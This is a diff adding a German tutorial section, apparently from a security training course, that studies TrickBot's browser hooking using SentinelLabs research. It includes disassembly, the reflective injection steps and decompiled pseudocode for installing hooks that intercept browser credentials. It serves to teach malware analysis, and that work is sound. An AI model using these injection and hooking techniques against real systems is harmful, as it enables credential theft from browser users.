@@ -632,3 +632,103 @@ Im Kern jedes dieser Methoden wird Mathematik verwendet, um durch die physischen
 Einige der bekannteren Techniken umfassen das Parsen des RVA-Einstiegspunkts, die Abschnittszuordnung und das Parsen der Relocationstabelle.
 
 Bei allen Injektionstechniken ist die Möglichkeit, gängige Forschungsmethoden zu kombinieren, endlos. Dies bietet Ihnen als Angreifer eine Vielzahl von Optionen, um Ihre bösartigen Daten zu manipulieren und auszuführen.
+
+# Task 7 - Fallstudie zu Browser-Injection und Hooking
+Um einen praktischen Einblick in die Auswirkungen der Prozessinjektion zu bekommen, können wir die TTPs (Taktiken, Techniken und Verfahren) von TrickBot betrachten.
+
+Kredit für die anfängliche Forschung: [SentinelLabs](https://www.sentinelone.com/labs/how-trickbot-malware-hooking-engine-targets-windows-10-browsers/)
+
+TrickBot ist eine bekannte Banking-Malware, die kürzlich wieder an Popularität im Bereich finanzieller Schadsoftware gewonnen hat. Die Hauptfunktion der von uns untersuchten Malware ist das Browser-Hooking. Browser-Hooking ermöglicht es der Malware, interessante API-Aufrufe zu hooken, die zur Abfangen/Entwendung von Zugangsdaten verwendet werden können.
+
+Um unsere Analyse zu beginnen, schauen wir uns an, wie sie Browser angreifen. Aus der Reverse-Engineering-Analyse von SentinelLabs geht hervor, dass `OpenProcess` verwendet wird, um Handles für gängige Browser-Pfade zu erhalten, wie im folgenden Disassembly-Auszug zu sehen ist.
+```
+push   eax
+push   0
+push   438h
+call   ds:OpenProcess
+mov    edi, eax
+mov    [edp,hProcess], edi
+test   edi, edi
+jz     loc_100045EE
+```
+```
+push   offset Srch            ; "chrome.exe"
+lea    eax, [ebp+pe.szExeFile]
+...
+mov    eax, ecx
+push   offset aIexplore_exe   ; "iexplore.exe"
+push   eax                    ; lpFirst
+...
+mov    eax, ecx
+push   offset aFirefox_exe   ; "firefox.exe"
+push   eax                    ; lpFirst
+...
+mov    eax, ecx
+push   offset aMicrosoftedgec   ; "microsoftedgecp.exe"
+...
+```
+Der aktuelle Quellcode für die reflektive Injektion ist unklar, aber SentinelLabs hat den grundlegenden Programmablauf der Injektion wie folgt skizziert:
+
+1. Zielprozess öffnen, `OpenProcess`
+2. Speicher zuweisen, `VirtualAllocEx`
+3. Funktion in den zugewiesenen Speicher kopieren, `WriteProcessMemory`
+4. Shellcode in den zugewiesenen Speicher kopieren, `WriteProcessMemory`
+5. Cache leeren, um Änderungen zu übernehmen, `FlushInstructionCache`
+6. Einen Remote-Thread erstellen, `RemoteThread`
+7. Den Thread fortsetzen oder alternativ einen neuen Benutzer-Thread erstellen, `ResumeThread` oder `RtlCreateUserThread`
+
+Nach der Injektion wird TrickBot seine Hook-Installationsfunktion aufrufen, die im dritten Schritt in den Speicher kopiert wurde. Pseudo-Code für die Installationsfunktion wurde von SentinelLabs unten bereitgestellt.
+```C++
+relative_offset = myHook_function - *(_DWORD *)(original_function + 1) - 5;
+v8 = (unsigned __int8)original_function[5];
+trampoline_lpvoid = *(void **)(original_function + 1);
+jmp_32_bit_relative_offset_opcode = 0xE9u;		// "0xE9" -> opcode for a jump with a 32bit relative offset
+
+if ( VirtualProtectEx((HANDLE)0xFFFFFFFF, trampoline_lpvoid, v8, 0x40u, &flOldProtect) )	// Set up the function for "PAGE_EXECUTE_READWRITE" w/ VirtualProtectEx
+{
+	v10 = *(_DWORD *)(original_function + 1);
+	v11 = (unsigned __int8)original_function[5] - (_DWORD)original_function - 0x47;
+	original_function[66] = 0xE9u;
+	*(_DWORD *)(original_function + 0x43) = v10 + v11;
+	write_hook_iter(v10, &jmp_32_bit_relative_offset_opcode, 5); // -> Manually write the hook
+	VirtualProtectEx(		// Return to original protect state
+		(HANDLE)0xFFFFFFFF,
+		*(LPVOID *)(original_function + 1),
+		(unsigned __int8)original_function[5],
+		flOldProtect,
+		&flOldProtect);
+result = 1;
+```
+Lassen Sie uns diesen Code aufschlüsseln. Er mag auf den ersten Blick überwältigend erscheinen, aber er kann in kleinere Abschnitte unterteilt werden, die auf dem Wissen basieren, das wir in diesem Raum gesammelt haben.
+
+Der erste interessante Abschnitt des Codes kann als Funktionszeiger identifiziert werden; Sie erinnern sich vielleicht an diese aus der vorherigen Aufgabe zum Aufrufen von Funktionszeigern.
+```C++
+relative_offset = myHook_function - *(_DWORD *)(original_function + 1) - 5;
+v8 = (unsigned __int8)original_function[5];
+trampoline_lpvoid = *(void **)(original_function + 1);
+```
+
+Sobald die Funktionszeiger definiert sind, wird die Malware diese verwenden, um die Speicherprotektions der Funktion mithilfe von `VirtualProtectEx` zu ändern.
+```C++
+if ( VirtualProtectEx((HANDLE)0xFFFFFFFF, trampoline_lpvoid, v8, 0x40u, &flOldProtect) )
+```
+
+An diesem Punkt wird der Code zur "maliziösen Spielerei" mit Funktionszeiger-Hooking. Es ist nicht notwendig, die technischen Details dieses Codes für diesen Raum vollständig zu verstehen. Im Wesentlichen wird dieser Codeteil einen Hook umschreiben, um auf einen Opcode-Sprung zu verweisen.
+```C++
+v10 = *(_DWORD *)(original_function + 1);
+v11 = (unsigned __int8)original_function[5] - (_DWORD)original_function - 0x47;
+original_function[66] = 0xE9u;
+*(_DWORD *)(original_function + 0x43) = v10 + v11;
+write_hook_iter(v10, &jmp_32_bit_relative_offset_opcode, 5); // -> Manually write the hook
+```
+
+Sobald der Hook gesetzt ist, wird die Funktion in ihre ursprünglichen Speicherprotektions zurückversetzt.
+```C++
+VirtualProtectEx(		// Return to original protect state
+		(HANDLE)0xFFFFFFFF,
+		*(LPVOID *)(original_function + 1),
+		(unsigned __int8)original_function[5],
+		flOldProtect,
+		&flOldProtect);
+```
+Das mag immer noch wie eine Menge Code und technisches Wissen erscheinen, und das ist in Ordnung! Die Hauptaussage der Hooking-Funktion von TrickBot ist, dass sie sich mithilfe reflektiver Injektion in Browser-Prozesse einschleusen und API-Aufrufe aus der injizierten Funktion hooken wird.
